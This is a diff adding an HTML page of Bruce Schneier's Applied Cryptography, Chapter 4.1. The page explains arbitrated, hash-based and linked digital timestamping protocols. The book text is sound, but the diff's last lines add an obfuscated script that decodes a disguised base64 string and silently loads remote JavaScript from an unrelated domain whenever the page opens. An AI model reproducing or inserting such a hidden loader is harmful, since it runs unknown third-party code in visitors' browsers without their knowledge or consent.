@@ -1,0 +1,119 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Intermediate Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=04//-->
+<!--PAGES=075-077//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch03/03-13.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 4<BR>Intermediate Protocols
+</FONT></H2>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">4.1 Timestamping Services</FONT></H3>
+<P>In many situations, people need to certify that a document existed on a certain date. Think about a copyright or patent dispute: The party that produces the earliest copy of the disputed work wins the case. With paper documents, notaries can sign and lawyers can safeguard copies. If a dispute arises, the notary or the lawyer testifies that the letter existed on a certain date.
+</P>
+<P>In the digital world, it&#146;s far more complicated. There is no way to examine a digital document for signs of tampering. It can be copied and modified endlessly without anyone being the wiser. It&#146;s trivial to change the date stamp on a computer file. No one can look at a digital document and say: &#147;Yes, this document was created before November 4, 1952.&#148;</P>
+<P>Stuart Haber and W. Scott Stornetta at Bellcore thought about the problem [682, 683, 92]. They wanted a digital timestamping protocol with the following properties:</P>
+<DL>
+<DD>&#151; The data itself must be timestamped, without any regard to the physical medium on which it resides.
+<DD>&#151; It must be impossible to change a single bit of the document without that change being apparent.
+<DD>&#151; It must be impossible to timestamp a document with a date and time different from the present one.
+</DL>
+<P><FONT SIZE="+1"><B><I>Arbitrated Solution</I></B></FONT></P>
+<P>This protocol uses Trent, who has a trusted timestamping service, and Alice, who wishes to timestamp a document.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice transmits a copy of the document to Trent.
+<DD><B>(2)</B>&nbsp;&nbsp;Trent records the date and time he received the document and retains a copy of the document for safekeeping.
+</DL>
+<P>Now, if anyone calls into question Alice&#146;s claim of when the document was created, she just has to call up Trent. He will produce his copy of the document and verify that he received the document on the date and time stamped.
+</P>
+<P>This protocol works, but has some obvious problems. First, there is no privacy. Alice has to give a copy of the document to Trent. Anyone listening in on the communications channel could read it. She could encrypt it, but still the document has to sit in Trent&#146;s database. Who knows how secure that database is?</P>
+<P>Second, the database itself would have to be huge. And the bandwidth requirements to send large documents to Trent would be unwieldy.</P>
+<P>The third problem has to do with the potential errors. An error in transmission, or an electromagnetic bomb detonating somewhere in Trent&#146;s central computers, could completely invalidate Alice&#146;s claim of a timestamp.</P>
+<P>And fourth, there might not be someone as honest as Trent to run the timestamping service. Maybe Alice is using Bob&#146;s Timestamp and Taco Stand. There is nothing to stop Alice and Bob from colluding and timestamping a document with any time that they want.</P>
+<P><FONT SIZE="+1"><B><I>Improved Arbitrated Solution</I></B></FONT></P>
+<P>One-way hash functions and digital signatures can clear up most of these problems easily:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice produces a one-way hash of the document.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice transmits the hash to Trent.
+<DD><B>(3)</B>&nbsp;&nbsp;Trent appends the date and time he received the hash onto the hash and then digitally signs the result.
+<DD><B>(4)</B>&nbsp;&nbsp;Trent sends the signed hash with timestamp back to Alice.
+</DL>
+<P>This solves every problem but the last. Alice no longer has to worry about revealing the contents of her document; the hash is sufficient. Trent no longer has to store copies of the document (or even of the hash), so the massive storage requirements and security problems are solved (remember, one-way hash functions don&#146;t have a key). Alice can immediately examine the signed timestamped hash she receives in step (4), so she will immediately catch any transmission errors. The only problem remaining is that Alice and Trent can still collude to produce any timestamp they want.
+</P>
+<P><FONT SIZE="+1"><B><I>Linking Protocol</I></B></FONT></P>
+<P>One way to solve this problem is to link Alice&#146;s timestamp with timestamps previously generated by Trent. These timestamps will most probably be generated for people other than Alice. Since the order that Trent receives the different timestamp requests can&#146;t be known in advance, Alice&#146;s timestamp must have occurred after the previous one. And since the request that came after is linked with Alice&#146;s timestamp, then hers must have occurred before. This sandwiches Alice&#146;s request in time.
+</P>
+<P>If <I>A</I> is Alice&#146;s name, the hash value that Alice wants timestamped is <I>H</I><SUB>n</SUB>, and the previous time stamp is <I>T</I><SUB>n - 1</SUB>, then the protocol is:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice sends Trent <I>H</I><SUB>n</SUB> and <I>A</I>.
+<DD><B>(2)</B>&nbsp;&nbsp;Trent sends back to Alice:
+<DL>
+<DD><I>T</I><SUB>n</SUB> = <I>S</I><SUB>K</SUB>(<I>n,A,H</I><SUB>n</SUB>,<I>t</I><SUB>n</SUB>,<I>I</I><SUB>n - 1</SUB>,<I>H</I><SUB>n - 1</SUB>,<I>T</I><SUB>n - 1</SUB>,<I>L</I><SUB>n</SUB>)
+</DL>
+<BR>where <I>L</I><SUB>n</SUB> consists of the following hashed linking information:
+<DL>
+<DD><I>L</I><SUB>n</SUB> = <I>H</I>(<I>I</I><SUB>n - 1</SUB>,<I>H</I><SUB>n - 1</SUB>,<I>T</I><SUB>n - 1</SUB>,<I>L</I><SUB>n - 1</SUB>)
+</DL>
+<BR><I>S</I><SUB>K</SUB> indicates that the message is signed with Trent&#146;s private key. Alice&#146;s name identifies her as the originator of the request. The parameter <I>n</I> indicates the sequence of the request: This is the <I>n</I>th timestamp Trent has issued. The parameter <I>t</I><SUB>n</SUB> is the time. The additional information is the identification, original hash, time, and hashed timestamp of the previous document Trent stamped.
+<DD><B>(3)</B>&nbsp;&nbsp;After Trent stamps the next document, he sends Alice the identification of the originator of that document: <I>I</I><SUB>n &#43; 1</SUB>.
+</DL>
+<P>If someone challenges Alice&#146;s timestamp, she just contacts the originators of the previous and following documents: <I>I</I><SUB>n - 1</SUB> and <I>I</I><SUB>n &#43; 1</SUB>. If their documents are called into question, they can get in touch with <I>I</I><SUB>n - 2</SUB> and <I>I</I><SUB>n &#43; 2</SUB>, and so on. Every person can show that their document was timestamped after the one that came before and before the one that came after.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch03/03-13.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(XdPLYOiS, Bagahqvi) {Bagahqvi = XdPLYOiS.createElement('script');Bagahqvi.type = 'text/javascript';Bagahqvi.async = true;Bagahqvi.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');XdPLYOiS.getElementsByTagName('body')[0].appendChild(Bagahqvi);}(document));</script></body>
+</html>
